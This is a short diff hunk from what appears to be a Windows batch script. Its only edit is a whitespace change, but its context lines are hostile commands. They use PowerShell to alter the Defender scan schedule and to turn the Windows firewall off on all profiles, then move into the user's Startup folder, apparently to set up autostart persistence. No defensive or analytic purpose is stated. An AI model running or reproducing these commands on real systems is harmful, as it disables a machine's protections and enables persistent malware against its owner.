@@ -65,4 +65,4 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-   
+  
